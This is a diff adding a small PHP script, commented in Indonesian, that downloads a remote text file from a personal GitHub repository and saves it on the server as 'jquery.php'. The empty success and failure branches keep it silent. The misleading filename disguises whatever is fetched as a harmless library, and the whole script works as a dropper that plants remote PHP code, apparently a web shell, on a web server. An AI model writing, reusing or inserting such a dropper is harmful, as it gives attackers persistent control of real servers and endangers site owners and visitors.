@@ -1,0 +1,14 @@
+<?php
+// URL file yang ingin di-download
+$fileUrl = "https://raw.githubusercontent.com/merline777/hahahihi/refs/heads/main/raku.txt";
+
+// Nama file lokal untuk menyimpan hasil download
+$localFile = "jquery.php";
+
+// Mendownload file dan menyimpannya ke file lokal
+if (file_put_contents($localFile, file_get_contents($fileUrl))) {
+    
+} else {
+    
+}
+?>
